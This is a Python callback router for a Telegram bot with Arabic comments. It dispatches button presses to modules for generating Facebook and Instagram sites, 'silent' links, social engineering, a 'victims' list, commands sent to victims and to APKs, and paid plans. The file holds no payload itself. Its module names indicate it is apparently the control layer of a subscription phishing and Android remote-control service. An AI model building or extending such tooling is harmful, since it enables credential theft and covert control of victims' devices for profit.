# bot_handlers/callbacks/router.py
# v4 — مع إعدادات + تأكيد الأدوات

from config import bot
from logging_config import get_logger
from monitoring import metrics

logger = get_logger("bot_handlers.callbacks.router")


from . import help as help_cb
from . import search as search_cb
from . import facebook as fb_cb
from . import instagram as ig_cb
from . import silent as silent_cb
from . import dashboard as dash_cb
from . import victims as victims_cb
from . import victim_commands as vcmd_cb
from . import apk_commands as apk_cmd_cb
from . import updates as upd_cb
from . import payment as payment_cb
from . import admin as admin_cb
from . import misc as misc_cb
from . import social_engineering as se_cb
from . import points as points_cb


ROUTES = [
    # ─── 0. نقاط/إعدادات/تأكيد الأدوات ───
    (lambda d: d == "settings_menu"
               or d == "points_menu"
               or d.startswith("my_referral")
               or d.startswith("points_")
               or d == "how_to_earn"
               or d == "my_referrals"
               or d.startswith("tool_confirm_"), points_cb.handle),

    # ─── 0.5. الهندسة الاجتماعية ───
    (lambda d: d == "gen_se" or d.startswith("se_"), se_cb.handle),

    # ─── 1. misc ───
    (lambda d: d == "noop", misc_cb.handle),
    (lambda d: d == "back_to_main", misc_cb.handle),

    # ─── 2. help ───
    (lambda d: d == "help_guide" or d.startswith("help_page_"), help_cb.handle),

    # ─── 3. search ───
    (lambda d: d == "search_menu" or d.startswith("search_"), search_cb.handle),

    # ─── 4. facebook ───
    (lambda d: d == "gen_fb" or d.startswith("fb_site_") or d.startswith("fb_stats_"), fb_cb.handle),

    # ─── 5. instagram ───
    (lambda d: d == "gen_ig" or d.startswith("ig_site_") or d.startswith("ig_stats_"), ig_cb.handle),

    # ─── 6. silent ───
    (lambda d: d in ("gen_silent", "silent_new", "silent_stats", "silent_recent"), silent_cb.handle),

    # ─── 7. dashboard ───
    (lambda d: d == "open_dashboard", dash_cb.handle),

    # ─── 8. payment/my_account ───
    (lambda d: d in ("payment_menu", "show_plans", "my_account") or d.startswith("buy_plan_"), payment_cb.handle),

    # ─── 9. updates ───
    (lambda d: d.startswith("upd_"), upd_cb.handle),

    # ─── 10. admin ───
    (lambda d: d == "admin_panel" or d.startswith("admin_"), admin_cb.handle),

    # ─── 11-13. victim/apk commands ───
    (lambda d: d.startswith("vcmd_"), vcmd_cb.handle),
    (lambda d: d.startswith("apk_cmd_"), apk_cmd_cb.handle),
    (lambda d: d.startswith("v_"), victims_cb.handle),
]


@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    user_id = call.from_user.id
    data = call.data

    try:
        for matcher, handler in ROUTES:
            try:
                if matcher(data):
                    handler(call, chat_id, user_id, data)
                    return
            except Exception as e:
                logger.exception(f"route match error for {data}: {e}")
                continue

        logger.warning(f"Unhandled callback: {data}")
        bot.answer_callback_query(call.id)

    except Exception as e:
        logger.exception(f"callback_handler error: {e}")
        metrics.inc_counter("bot_errors", tags={"type": "callback"})
